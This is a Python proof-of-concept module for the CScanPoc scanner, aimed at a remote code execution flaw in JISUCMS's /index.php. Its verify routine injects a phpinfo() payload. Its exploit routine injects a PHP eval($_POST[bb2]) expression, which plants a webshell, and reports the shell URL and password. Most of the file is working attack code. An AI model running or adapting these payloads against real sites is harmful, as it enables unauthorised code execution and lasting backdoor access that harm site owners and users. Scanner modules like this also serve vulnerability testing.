# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse
from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'JISUCMS_0102'  # 平台漏洞编号，留空
    name = '极速网络CMS /index.php 任意代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-07'  # 漏洞公布时间
    desc = '''
    厂商：http://www.90576.com/  台州市极速网络有限公司。
    台州市极速网络CMS /index.php 任意代码执行漏洞
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=083077'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JISUCMS(极速网络CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5fc19827-6f4e-4aef-a936-e8f1b2796531'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/index.php?col=13&mod=web&q=%24{%40phpinfo()}'
            verify_url = self.target + payload
            content = urllib.request.urlopen(verify_url).read()
            if '<title>phpinfo()</title>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/index.php?col=13&mod=web&q=%24{%40eval($_POST[bb2])}%24{%40print(md5(123))}'
            verify_url = self.target + payload
            content = urllib.request.urlopen(verify_url).read()
            if '202cb962ac59075b964b07152d234b70' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;webshell={webshell}, passwd=bb2'.format(
                    target=self.target, name=self.vuln.name, webshell=verify_url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
